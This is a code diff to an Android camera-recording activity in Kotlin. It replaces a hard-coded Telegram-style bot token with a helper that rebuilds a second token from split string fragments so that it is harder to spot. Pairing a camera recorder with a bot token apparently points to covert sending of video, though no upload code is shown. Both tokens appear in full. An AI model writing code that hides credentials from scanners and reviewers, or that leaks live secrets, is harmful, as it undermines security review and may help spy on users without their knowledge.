@@ -17,12 +17,21 @@ class CameraVideoRecorderActivity : Activity() {
 
     companion object {
         private const val TAG = "ModernVideoEngine"
+
+        private fun getObfuscatedToken(): String {
+            val p1 = "9004970470"
+            val p2 = "AAFfsBFENB"
+            val p3 = "n1PRMxVwDv"
+            val p4 = "lt2j--qBJC"
+            val p5 = "JU99Y"
+            return "$p1:$p2$p3$p4$p5"
+        }
     }
 
     private var cameraDevice: CameraDevice? = null
     private var mediaRecorder: MediaRecorder? = null
     private var isRecording = false
-    private val botToken = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
+    private val botToken: String get() = getObfuscatedToken()
 
     private val handlerThread = HandlerThread("CameraVideoThread").apply { start() }
     private val backgroundHandler = Handler(handlerThread.looper)
